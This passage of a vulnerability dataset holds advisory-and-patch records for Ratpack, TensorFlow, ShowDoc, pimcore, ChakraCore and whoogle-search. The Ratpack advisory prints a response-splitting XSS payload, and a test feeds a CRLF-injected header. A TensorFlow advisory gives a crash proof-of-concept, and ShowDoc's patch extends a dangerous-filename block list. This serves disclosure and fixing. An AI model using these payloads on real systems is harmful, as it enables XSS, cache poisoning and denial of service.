channel](https:\/\/slack-signup.ratpack.io\/)","published_date":"2019-10-21","chain_len":2,"project":"https:\/\/github.com\/ratpack\/ratpack","commit_href":"https:\/\/github.com\/ratpack\/ratpack\/commit\/c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae","commit_sha":"c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae","patch":"MULTI","chain_ord":"['efb910d38a96494256f36675ef0e5061097dd77d', 'c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae']","before_first_fix_commit":"{'efb910d38a96494256f36675ef0e5061097dd77d'}","last_fix_commit":"c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae","chain_ord_pos":2.0,"commit_datetime":"10\/08\/2019, 23:43:23","message":"Add test for response header validation","author":"Luke Daley","comments":null,"stats":"{'additions': 42, 'deletions': 0, 'total': 42}","files":"{'ratpack-core\/src\/test\/groovy\/ratpack\/http\/ResponseHeaderValidationSpec.groovy': {'additions': 42, 'deletions': 0, 'changes': 42, 'status': 'added', 'raw_url': 'https:\/\/github.com\/ratpack\/ratpack\/raw\/c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae\/ratpack-core%2Fsrc%2Ftest%2Fgroovy%2Fratpack%2Fhttp%2FResponseHeaderValidationSpec.groovy', 'patch': '@@ -0,0 +1,42 @@\\n+\/*\\n+ * Copyright 2019 the original author or authors.\\n+ *\\n+ * Licensed under the Apache License, Version 2.0 (the \"License\");\\n+ * you may not use this file except in compliance with the License.\\n+ * You may obtain a copy of the License at\\n+ *\\n+ *    http:\/\/www.apache.org\/licenses\/LICENSE-2.0\\n+ *\\n+ * Unless required by applicable law or agreed to in writing, software\\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\n+ * See the License for the specific language governing permissions and\\n+ * limitations under the License.\\n+ *\/\\n+\\n+package ratpack.http\\n+\\n+import ratpack.test.internal.RatpackGroovyDslSpec\\n+\\n+class ResponseHeaderValidationSpec extends RatpackGroovyDslSpec {\\n+\\n+  def \"invalid header values yield exception\"() {\\n+    when:\\n+    handlers {\\n+      all {\\n+        try {\\n+          header(\"Test\", \"value\\\\r\\\\nAnotherHeader: another value\")\\n+          render \"ok\"\\n+        } catch (e) {\\n+          render e.toString()\\n+        }\\n+      }\\n+    }\\n+\\n+    then:\\n+    def response = get()\\n+    response.headers.names == [\\'content-type\\', \\'content-length\\'].toSet()\\n+    response.body.text == \"java.lang.IllegalArgumentException: only \\' \\' and \\'\\\\\\\\t\\' are allowed after \\'\\\\\\\\n\\': value\\\\r\\\\nAnotherHeader: another value\"\\n+  }\\n+\\n+}'}}","message_norm":"add test for response header validation","language":"en","entities":"[('add', 'ACTION', ''), ('header validation', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ratpack-core\/src\/test\/groovy\/ratpack\/http\/ResponseHeaderValidationSpec.groovy'])","num_files":1.0},{"index":2472,"vuln_id":"GHSA-mvqp-q37c-wf9j","cwe_id":"{'CWE-74'}","score":7.5,"chain":"{'https:\/\/github.com\/ratpack\/ratpack\/commit\/c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae', 'https:\/\/github.com\/ratpack\/ratpack\/commit\/efb910d38a96494256f36675ef0e5061097dd77d'}","dataset":"osv","summary":"Moderate severity vulnerability that affects io.ratpack:ratpack-core ## CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\n\nVersions of Ratpack 0.9.1 through and including 1.7.4 are vulnerable to [HTTP Response Splitting](https:\/\/www.owasp.org\/index.php\/HTTP_Response_Splitting), \nif untrusted and unsanitized data is used to populate the headers of an HTTP response.\nAn attacker can utilize this vulnerability to have the server issue any HTTP response they specify.\n\nIf your application uses arbitrary user input as the value of a response header it is vulnerable.\nIf your application does not use arbitrary values as response header values, it is not vulnerable.\n\nPreviously, Ratpack did not validate response header values.\nNow, adding a header value that contains the header value termination characters (CRLF) produces a runtime exception.\nSince there is no mechanism for escaping or encoding the termination characters in a String, a runtime exception is necessary.\n\nAs potentially dangerous values now cause runtime exceptions, it is a good idea to continue to validate and sanitize any user-supplied values being used as response headers.\n\nWe would like to thank [Jonathan Leitschuh](https:\/\/github.com\/JLLeitschuh) for reporting this vulnerability.\n\n### Vulnerable Example\n\nThe following example server uses a query parameter value as a response header, without validating or sanitizing it.\n```java\nRatpackServer startedServer =  RatpackServer.start(server -> {\n    server.handlers(chain -> chain.all(ctx -> {\n        \/\/ User supplied query parameter\n        String header = ctx.getRequest().getQueryParams().get(\"header\");\n        \/\/ User supplied data used to populate a header value.\n        ctx.header(\"the-header\", header)\n            .render(\"OK!\");\n    }));\n});\n```\n\nSending a request to the server with the following value for the `header` query param would allow the execution of arbitrary Javascript.\n\n```\nContent-Type: text\/html\nX-XSS-Protection: 0\n\n<script>alert(document.domain)<\/script>\n```\n\n### Impact\n\n- Cross-User Defacement\n- Cache Poisoning\n- Cross-Site Scripting\n- Page Hijacking\n\n### Patches\n\nThis vulnerability has been patched in Ratpack version 1.7.5.\n\n### Root Cause\n\nThe root cause was due to using the netty `DefaultHttpHeaders` object with verification disabled.\n\nhttps:\/\/github.com\/ratpack\/ratpack\/blob\/af1e8c8590f164d7dd84d4212886fad4ead99080\/ratpack-core\/src\/main\/java\/ratpack\/server\/internal\/NettyHandlerAdapter.java#L159\n\nThis vulnerability is now more clearly documented in the Netty documentation: https:\/\/github.com\/netty\/netty\/pull\/9646\n\n### Workarounds\n\nThe workaround for this vulnerability is to either not use arbitrary input as response header values or validate such values before being used to ensure they don't contain a carriage return and\/or line feed characters.\n\n### References\n\n - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https:\/\/cwe.mitre.org\/data\/definitions\/113.html)\n - Fix commit: https:\/\/github.com\/ratpack\/ratpack\/commit\/efb910d38a96494256f36675ef0e5061097dd77d\n \n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [ratpack\/ratpack](https:\/\/github.com\/ratpack\/ratpack\/issues)\n* Ask in our [Slack channel](https:\/\/slack-signup.ratpack.io\/)","published_date":"2019-10-21","chain_len":2,"project":"https:\/\/github.com\/ratpack\/ratpack","commit_href":"https:\/\/github.com\/ratpack\/ratpack\/commit\/efb910d38a96494256f36675ef0e5061097dd77d","commit_sha":"efb910d38a96494256f36675ef0e5061097dd77d","patch":"MULTI","chain_ord":"['efb910d38a96494256f36675ef0e5061097dd77d', 'c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae']","before_first_fix_commit":"{'efb910d38a96494256f36675ef0e5061097dd77d'}","last_fix_commit":"c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae","chain_ord_pos":1.0,"commit_datetime":"10\/08\/2019, 23:24:24","message":"Enable HTTP header validation","author":"Luke Daley","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'ratpack-core\/src\/main\/java\/ratpack\/server\/internal\/NettyHandlerAdapter.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ratpack\/ratpack\/raw\/efb910d38a96494256f36675ef0e5061097dd77d\/ratpack-core%2Fsrc%2Fmain%2Fjava%2Fratpack%2Fserver%2Finternal%2FNettyHandlerAdapter.java', 'patch': '@@ -156,7 +156,7 @@ private void newRequest(ChannelHandlerContext ctx, HttpRequest nettyRequest) thr\\n       channel.attr(CLIENT_CERT_KEY).get()\\n     );\\n \\n-    HttpHeaders nettyHeaders = new DefaultHttpHeaders(false);\\n+    HttpHeaders nettyHeaders = new DefaultHttpHeaders();\\n     MutableHeaders responseHeaders = new NettyHeadersBackedMutableHeaders(nettyHeaders);\\n     AtomicBoolean transmitted = new AtomicBoolean(false);'}}","message_norm":"enable http header validation","language":"nl","entities":"[('header validation', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ratpack-core\/src\/main\/java\/ratpack\/server\/internal\/NettyHandlerAdapter.java'])","num_files":1.0},{"index":2475,"vuln_id":"GHSA-mw6j-hh29-h379","cwe_id":"{'CWE-190'}","score":0.0,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3796cc4fcd93ae55812a457abc96dcd55fbb854b'}","dataset":"osv","summary":"`CHECK` failure in depthwise ops via overflows ### Impact\nThe implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)\nfilter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)\nout_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)\ntf.raw_ops.DepthwiseConv2dNativeBackpropFilter(\n    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=\"SAME\")\n```\n  \nThis is another instance of [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md) (CVE-2021-41197).\n  \n### Patches\nWe have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3796cc4fcd93ae55812a457abc96dcd55fbb854b).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.","published_date":"2022-05-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3796cc4fcd93ae55812a457abc96dcd55fbb854b","commit_sha":"3796cc4fcd93ae55812a457abc96dcd55fbb854b","patch":"SINGLE","chain_ord":"['3796cc4fcd93ae55812a457abc96dcd55fbb854b']","before_first_fix_commit":"{'8f704c59219243ee66bdeb93cb3471e8e6af7d86'}","last_fix_commit":"3796cc4fcd93ae55812a457abc96dcd55fbb854b","chain_ord_pos":1.0,"commit_datetime":"04\/27\/2022, 22:53:46","message":"Fix tf.raw_ops.DepthwiseConv2dNativeBackpropInput vulnerability with large input sizes.\n\nUse AddDimWithStatus rather than AddDim in order to catch and report integer overflow gracefully.\n\nPiperOrigin-RevId: 444989983","author":"Alan Liu","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'tensorflow\/core\/kernels\/depthwise_conv_grad_op.cc': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/3796cc4fcd93ae55812a457abc96dcd55fbb854b\/tensorflow%2Fcore%2Fkernels%2Fdepthwise_conv_grad_op.cc', 'patch': '@@ -625,7 +625,7 @@ class DepthwiseConv2dNativeBackpropInputOp : public OpKernel {\\n       OP_REQUIRES(context, in_sizes_data[i] >= 0,\\n                   errors::InvalidArgument(\"Dimension \", i,\\n                                           \" of input_sizes must be >= 0\"));\\n-      input_shape.AddDim(in_sizes_data[i]);\\n+      OP_REQUIRES_OK(context, input_shape.AddDimWithStatus(in_sizes_data[i]));\\n     }\\n     const TensorShape& filter_shape = filter.shape();\\n     EXTRACT_AND_VERIFY_DIMENSIONS(\"DepthwiseConv2DBackpropInput\");\\n@@ -1131,7 +1131,8 @@ class DepthwiseConv2dNativeBackpropFilterOp : public OpKernel {\\n       OP_REQUIRES(context, filter_sizes_data[i] >= 0,\\n                   errors::InvalidArgument(\"Dimension \", i,\\n                                           \" of filter_sizes must be >= 0\"));\\n-      filter_shape.AddDim(filter_sizes_data[i]);\\n+      OP_REQUIRES_OK(context,\\n+                     filter_shape.AddDimWithStatus(filter_sizes_data[i]));\\n     }\\n     const TensorShape& input_shape = input.shape();'}}","message_norm":"fix tf.raw_ops.depthwiseconv2dnativebackpropinput vulnerability with large input sizes.\n\nuse adddimwithstatus rather than adddim in order to catch and report integer overflow gracefully.\n\npiperorigin-revid: 444989983","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('integer overflow', 'SECWORD', ''), ('444989983', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/depthwise_conv_grad_op.cc'])","num_files":1.0},{"index":2476,"vuln_id":"GHSA-mw6v-crh8-8533","cwe_id":"{'CWE-190'}","score":9.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d107fee1e4a9a4462f01564798d345802acc2aef'}","dataset":"osv","summary":"Integer Overflow or Wraparound in Google TensorFlow Google TensorFlow 1.7.x and earlier is affected by a Buffer Overflow vulnerability. The type of exploitation is context-dependent.","published_date":"2019-04-30","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d107fee1e4a9a4462f01564798d345802acc2aef","commit_sha":"d107fee1e4a9a4462f01564798d345802acc2aef","patch":"SINGLE","chain_ord":"['d107fee1e4a9a4462f01564798d345802acc2aef']","before_first_fix_commit":"{'f8acfb01792886274778d9ad7a9d990cbef14141'}","last_fix_commit":"d107fee1e4a9a4462f01564798d345802acc2aef","chain_ord_pos":1.0,"commit_datetime":"04\/04\/2018, 23:26:25","message":"Check that n + kBlockTrailerSize does not overflow before reading a block\n\nPiperOrigin-RevId: 191666300","author":"Frank Chen","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'tensorflow\/core\/lib\/io\/format.cc': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/d107fee1e4a9a4462f01564798d345802acc2aef\/tensorflow%2Fcore%2Flib%2Fio%2Fformat.cc', 'patch': '@@ -13,6 +13,8 @@ See the License for the specific language governing permissions and\\n limitations under the License.\\n ==============================================================================*\/\\n \\n+#include <limits>\\n+\\n #include \"tensorflow\/core\/lib\/io\/format.h\"\\n \\n #include \"tensorflow\/core\/lib\/core\/coding.h\"\\n@@ -84,6 +86,11 @@ Status ReadBlock(RandomAccessFile* file, const BlockHandle& handle,\\n   \/\/ Read the block contents as well as the type\/crc footer.\\n   \/\/ See table_builder.cc for the code that built this structure.\\n   size_t n = static_cast<size_t>(handle.size());\\n+\\n+  if (kBlockTrailerSize > std::numeric_limits<size_t>::max() - n) {\\n+    return errors::DataLoss(\"handle.size() too big\");\\n+  }\\n+\\n   char* buf = new char[n + kBlockTrailerSize];\\n   StringPiece contents;\\n   Status s = file->Read(handle.offset(), n + kBlockTrailerSize, &contents, buf);'}}","message_norm":"check that n + kblocktrailersize does not overflow before reading a block\n\npiperorigin-revid: 191666300","language":"en","entities":"[('overflow', 'SECWORD', ''), ('191666300', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/lib\/io\/format.cc'])","num_files":1.0},{"index":2477,"vuln_id":"GHSA-mw75-qvfr-hpmr","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/830c89a4c2c5fd0dd491422bf8e97b4eb5713f55'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc is vulnerable to stored cross-site scripting through file upload in versions 2.10.3 and prior. A patch is available and anticipated to be part of version 2.10.4.","published_date":"2022-03-15","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/830c89a4c2c5fd0dd491422bf8e97b4eb5713f55","commit_sha":"830c89a4c2c5fd0dd491422bf8e97b4eb5713f55","patch":"SINGLE","chain_ord":"['830c89a4c2c5fd0dd491422bf8e97b4eb5713f55']","before_first_fix_commit":"{'da56d1d68702a7a80506245c251e58eaf84cff27', '42c0d9813df3035728b36116a6ce9116e6fa8ed3'}","last_fix_commit":"830c89a4c2c5fd0dd491422bf8e97b4eb5713f55","chain_ord_pos":1.0,"commit_datetime":"03\/13\/2022, 08:03:16","message":"Merge pull request #1628 from ajaysenr\/master\n\nUpdate AttachmentModel.class.php","author":"star7th","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/830c89a4c2c5fd0dd491422bf8e97b4eb5713f55\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -303,6 +303,7 @@ public function isDangerFilename($filename){\\n \\t\\t\\t|| $isDangerStr($filename , \".shtm\")\\n \\t\\t\\t|| $isDangerStr($filename , \"%\")\\n \\t\\t\\t|| $isDangerStr($filename , \".xml\")\\n+\\t\\t\\t|| $isDangerStr($filename , \".xxhtml\")\\n \\t\\t) {\\n \\t\\t\\treturn true;\\n \\t\\t}\\n@@ -312,4 +313,4 @@ public function isDangerFilename($filename){\\n \\n \\n \\n-}\\n\\\\ No newline at end of file\\n+}'}}","message_norm":"merge pull request #1628 from ajaysenr\/master\n\nupdate attachmentmodel.class.php","language":"en","entities":"[('#1628', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":2479,"vuln_id":"GHSA-mw7r-3g6w-85qg","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/6b1250b6ffea7006226dd937e52cf5b353fcfc15', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/242c59ea40c0428e1ced7366bf2c28bfbdda1999'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1139, CVE-2019-1140, CVE-2019-1141, CVE-2019-1195, CVE-2019-1196, CVE-2019-1197.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/242c59ea40c0428e1ced7366bf2c28bfbdda1999","commit_sha":"242c59ea40c0428e1ced7366bf2c28bfbdda1999","patch":"MULTI","chain_ord":"['242c59ea40c0428e1ced7366bf2c28bfbdda1999', '6b1250b6ffea7006226dd937e52cf5b353fcfc15']","before_first_fix_commit":"{'75162b7f2d8ac2b37d17564e9c979ba1bae707e8', '450a349fda1b153d758a9e01698b977e60870e4c'}","last_fix_commit":"6b1250b6ffea7006226dd937e52cf5b353fcfc15","chain_ord_pos":1.0,"commit_datetime":"07\/02\/2019, 20:12:05","message":"[CVE-2019-1131] Chakra Type confusion","author":"Taylor Woll","comments":null,"stats":"{'additions': 1, 'deletions': 4, 'total': 5}","files":"{'lib\/Parser\/Parse.cpp': {'additions': 1, 'deletions': 4, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/242c59ea40c0428e1ced7366bf2c28bfbdda1999\/lib%2FParser%2FParse.cpp', 'patch': '@@ -4664,10 +4664,7 @@ ParseNodePtr Parser::ParseMemberList(LPCOLESTR pNameHint, uint32* pNameHintLengt\\n                     }\\n                 }\\n \\n-                if (buildAST)\\n-                {\\n-                    CheckArgumentsUse(pidHint, GetCurrentFunctionNode());\\n-                }\\n+                CheckArgumentsUse(pidHint, GetCurrentFunctionNode());\\n \\n                 bool couldBeObjectPattern = !isObjectPattern && m_token.tk == tkAsg;\\n                 \/\/ Saving the current state as we may change the isObjectPattern down below.'}}","message_norm":"[cve-2019-1131] chakra type confusion","language":"en","entities":"[('cve-2019-1131', 'VULNID', 'CVE'), ('type confusion', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Parser\/Parse.cpp'])","num_files":1.0},{"index":2483,"vuln_id":"GHSA-mxh3-2699-98g9","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/b5a9ad65e5a4dde1916f02019f8686ad835681ce'}","dataset":"osv","summary":"Cross-site Scripting pimcore pimcore version 10.3.0 and prior is vulnerable to cross-site scripting.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/b5a9ad65e5a4dde1916f02019f8686ad835681ce","commit_sha":"b5a9ad65e5a4dde1916f02019f8686ad835681ce","patch":"SINGLE","chain_ord":"['b5a9ad65e5a4dde1916f02019f8686ad835681ce']","before_first_fix_commit":"{'6ccb5c12fc1be065ebce9c89c4677ee939b88597'}","last_fix_commit":"b5a9ad65e5a4dde1916f02019f8686ad835681ce","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2022, 14:23:39","message":"[Admin] DataObject - Escape class definitions group properly","author":"dpahuja","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'bundles\/AdminBundle\/Controller\/Admin\/DataObject\/ClassController.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/b5a9ad65e5a4dde1916f02019f8686ad835681ce\/bundles%2FAdminBundle%2FController%2FAdmin%2FDataObject%2FClassController.php', 'patch': \"@@ -861,7 +861,7 @@ public function fieldcollectionTreeAction(Request $request, EventDispatcherInter\\n                 if (!isset($groups[$item->getGroup()])) {\\n                     $groups[$item->getGroup()] = [\\n                         'id' => 'group_' . $item->getKey(),\\n-                        'text' => $item->getGroup(),\\n+                        'text' => htmlspecialchars($item->getGroup()),\\n                         'expandable' => true,\\n                         'leaf' => false,\\n                         'allowChildren' => true,\\n@@ -1266,7 +1266,7 @@ public function objectbrickTreeAction(Request $request, EventDispatcherInterface\\n                 if (!isset($groups[$item->getGroup()])) {\\n                     $groups[$item->getGroup()] = [\\n                         'id' => 'group_' . $item->getKey(),\\n-                        'text' => $item->getGroup(),\\n+                        'text' => htmlspecialchars($item->getGroup()),\\n                         'expandable' => true,\\n                         'leaf' => false,\\n                         'allowChildren' => true,\"}}","message_norm":"[admin] dataobject - escape class definitions group properly","language":"fr","entities":"[('admin', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Controller\/Admin\/DataObject\/ClassController.php'])","num_files":1.0},{"index":2484,"vuln_id":"GHSA-mxjj-953w-2c2v","cwe_id":"{'CWE-787', 'CWE-125'}","score":7.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8ee24e7949a203d234489f9da2c5bf45a7d5157d'}","dataset":"osv","summary":"Data corruption in tensorflow-lite ### Impact\nWhen determining the common dimension size of two tensors, TFLite uses a `DCHECK` which is no-op outside of debug compilation modes:\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/kernels\/internal\/types.h#L437-L442\n\nSince the function always returns the dimension of the first tensor, malicious attackers can craft cases where this is larger than that of the second tensor. In turn, this would result in reads\/writes outside of bounds since the interpreter will wrongly assume that there is enough data in both tensors.\n\n### Patches\nWe have patched the issue in 8ee24e7949a20 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2020-09-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8ee24e7949a203d234489f9da2c5bf45a7d5157d","commit_sha":"8ee24e7949a203d234489f9da2c5bf45a7d5157d","patch":"SINGLE","chain_ord":"['8ee24e7949a203d234489f9da2c5bf45a7d5157d']","before_first_fix_commit":"{'0b5662bc2be13a8c8f044d925d87fb6e56247cd8'}","last_fix_commit":"8ee24e7949a203d234489f9da2c5bf45a7d5157d","chain_ord_pos":1.0,"commit_datetime":"09\/18\/2020, 21:19:26","message":"[tflite] Ensure `MatchingDim` does not allow buffer overflow.\n\nWe check in `MatchingDim` that both arguments have the same dimensionality, however that is a `DCHECK` only enabled if building in debug mode. Hence, it could be possible to cause buffer overflows by passing in a tensor with larger dimensions as the second argument. To fix, we now make `MatchingDim` return the minimum of the two sizes.\n\nA much better fix would be to return a status object but that requires refactoring a large part of the codebase for minor benefits.\n\nPiperOrigin-RevId: 332526127\nChange-Id: If627d0d2c80a685217b6e0d1e64b0872dbf1c5e4","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tensorflow\/lite\/kernels\/internal\/types.h': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8ee24e7949a203d234489f9da2c5bf45a7d5157d\/tensorflow%2Flite%2Fkernels%2Finternal%2Ftypes.h', 'patch': '@@ -438,7 +438,7 @@ int MatchingArraySize(const ArrayType1& array1, int index1,\\n inline int MatchingDim(const RuntimeShape& shape1, int index1,\\n                        const RuntimeShape& shape2, int index2) {\\n   TFLITE_DCHECK_EQ(shape1.Dims(index1), shape2.Dims(index2));\\n-  return shape1.Dims(index1);\\n+  return std::min(shape1.Dims(index1), shape2.Dims(index2));\\n }\\n \\n template <typename... Args>'}}","message_norm":"[tflite] ensure `matchingdim` does not allow buffer overflow.\n\nwe check in `matchingdim` that both arguments have the same dimensionality, however that is a `dcheck` only enabled if building in debug mode. hence, it could be possible to cause buffer overflows by passing in a tensor with larger dimensions as the second argument. to fix, we now make `matchingdim` return the minimum of the two sizes.\n\na much better fix would be to return a status object but that requires refactoring a large part of the codebase for minor benefits.\n\npiperorigin-revid: 332526127\nchange-id: if627d0d2c80a685217b6e0d1e64b0872dbf1c5e4","language":"en","entities":"[('ensure', 'ACTION', ''), ('buffer overflow', 'SECWORD', ''), ('buffer overflows', 'SECWORD', ''), ('fix', 'ACTION', ''), ('332526127', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/internal\/types.h'])","num_files":1.0},{"index":2486,"vuln_id":"GHSA-mxvc-fwgx-j778","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/benbusby\/whoogle-search\/commit\/abc30d7da3b5c67be7ce84d4699f327442d44606'}","dataset":"osv","summary":"Whoogle Search Cross-site Scripting via string parameter The package whoogle-search before 0.7.2 is vulnerable to Cross-site Scripting (XSS) via the query string parameter q. In the case where it does not contain the http string, it is used to build the error_message that is then rendered in the error.html template, using the [flask.render_template](https:\/\/flask.palletsprojects.com\/en\/2.1.x\/api\/flask.render_template) function. However, the error_message is rendered using the [| safe filter](https:\/\/jinja.palletsprojects.com\/en\/3.1.x\/templates\/working-with-automatic-escaping), meaning the user input is not escaped.","published_date":"2022-07-15","chain_len":1,"project":"https:\/\/github.com\/benbusby\/whoogle-search","commit_href":"https:\/\/github.com\/benbusby\/whoogle-search\/commit\/abc30d7da3b5c67be7ce84d4699f327442d44606","commit_sha":"abc30d7da3b5c67be7ce84d4699f327442d44606","patch":"SINGLE","chain_ord":"['abc30d7da3b5c67be7ce84d4699f327442d44606']","before_first_fix_commit":"{'d62ceb84239ee0df677851f46eb885c40e98211f'}","last_fix_commit":"abc30d7da3b5c67be7ce84d4699f327442d44606","chain_ord_pos":1.0,"commit_datetime":"04\/26\/2022, 15:28:05","message":"Render error message w\/o `safe` filter\n\nThe error message shown in the error template does not need to be\nrendered using the safe filter, and furthermore opens up an XSS\nvulnerability.","author":"Ben Busby","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/templates\/error.html': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/benbusby\/whoogle-search\/raw\/abc30d7da3b5c67be7ce84d4699f327442d44606\/app%2Ftemplates%2Ferror.html', 'patch': '@@ -16,7 +16,7 @@\\n <div>\\n     <h1>Error<\/h1>\\n     <p>\\n-        {{ error_message|safe }}\\n+        {{ error_message }}\\n     <\/p>\\n     <hr>\\n     <p>'}}","message_norm":"render error message w\/o `safe` filter\n\nthe error message shown in the error template does not need to be\nrendered using the safe filter, and furthermore opens up an xss\nvulnerability.","language":"en","entities":"[('error', 'FLAW', ''), ('safe', 'SECWORD', ''), ('error', 'FLAW', ''), ('error', 'FLAW', ''), ('safe', 'SECWORD', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/templates\/error.html'])","num_files":1.0},{"index":2487,"vuln_id":"GHSA-p23j-g745-8449","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/a4e56547fb8b7450656bfd26dfc52b8477c8ef27', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d'}","dataset":"osv","summary":"Out-of-bounds write A 